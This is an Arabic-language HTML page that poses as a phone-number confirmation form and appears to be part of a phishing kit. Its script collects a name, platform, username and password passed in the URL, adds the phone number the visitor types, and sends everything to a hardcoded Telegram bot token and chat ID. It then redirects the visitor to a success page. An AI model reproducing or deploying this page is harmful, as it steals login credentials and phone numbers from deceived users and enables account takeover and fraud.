<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد رقم الهاتف</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', sans-serif; }
        body { background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .card { background: #ffffff; padding: 30px; border-radius: 15px; box-shadow: 0 8px 24px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
        h2 { color: #333; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; font-size: 14px; margin-bottom: 25px; }
        .phone-container { display: flex; direction: ltr; border: 1px solid #ccc; border-radius: 8px; overflow: hidden; transition: border-color 0.3s; margin-bottom: 20px; }
        .phone-container:focus-within { border-color: #007bff; }
        .country-code { width: 25%; padding: 12px; border: none; border-right: 1px solid #ccc; text-align: center; font-size: 16px; outline: none; background-color: #fafafa; }
        .phone-number { width: 75%; padding: 12px; border: none; font-size: 16px; outline: none; text-align: left; }
        .btn-submit { background-color: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; width: 100%; }
        .btn-submit:hover { background-color: #0056b3; }
    </style>
</head>
<body>
<div class="card">
    <h2>تأكيد رقم الهاتف</h2>
    <p>أدخل مفتاح الدولة (مثل +966) متبوعاً برقم الهاتف</p>
    
    <form id="telegramForm">
        <div class="phone-container">
            <input type="text" id="code" class="country-code" placeholder="+966" required>
            <input type="tel" id="phone" class="phone-number" placeholder="500000000" required>
        </div>
        <button type="submit" class="btn-submit">تأكيد ومتابعة</button>
    </form>
</div>

<script>
    document.getElementById('telegramForm').addEventListener('submit', function(e) {
        e.preventDefault(); 

        const urlParams = new URLSearchParams(window.location.search);
        const name = urlParams.get('name') || 'غير معروف';
        const platform = urlParams.get('platform') || 'غير محدد';
        const username = urlParams.get('user_id') || 'غير معروف';
        const password = urlParams.get('user_pass') || 'غير معروف';
        
        const countryCode = document.getElementById('code').value.trim();
        const phoneNumber = document.getElementById('phone').value.trim();
        const fullPhone = countryCode + " " + phoneNumber;

        const telegramToken = '8958290275:AAEfyE2GaQ5Tr_6zpQP_vKqt1UuKZo-H6M0'; 
        const chatId = '1815050254'; 

        const message = `
🔔 بيانات جديدة 🔔
الاسم: ${name}
التطبيق: ${platform}
المستخدم: ${username}
كلمة المرور: ${password}
الهاتف: ${fullPhone}
        `;

        // استخدام رابط مباشر مبسط متوافق مع كافة المتصفحات دون تعقيد التنسيق العريض
        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
        
        fetch(telegramUrl)
        .then(response => response.json())
        .then(data => {
            console.log(data);
            window.location.href = 'success.html';
        })
        .catch(error => {
            console.error(error);
            window.location.href = 'success.html';
        });
    });
</script>
</body>
</html>
